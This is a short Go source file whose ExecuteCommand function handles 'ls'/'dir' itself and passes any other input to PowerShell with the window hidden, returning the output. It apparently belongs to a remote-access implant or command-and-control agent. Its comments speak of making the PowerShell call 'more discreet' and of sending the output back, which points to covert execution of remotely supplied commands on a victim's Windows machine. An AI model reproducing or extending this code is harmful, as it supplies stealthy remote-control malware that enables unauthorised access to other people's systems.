package cmd

import (
	"os/exec"
	"strings"
	"syscall"
)

func ExecuteCommand(input string) (string, error) {

	toExec := strings.SplitN(input, " ", 2)
	switch toExec[0] {

	case "ls", "dir":
		args := "."
		if len(toExec) == 2 {
			args = toExec[1]
		}
		return ExecLs(args)

	default:
		/* TODO: improve the call to powershell to something more discreet ? */
		cmd := exec.Command("powershell", input)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		/* retrieve output or error & send it back! */
		out, err := cmd.CombinedOutput()
		return string(out), err
	}
}
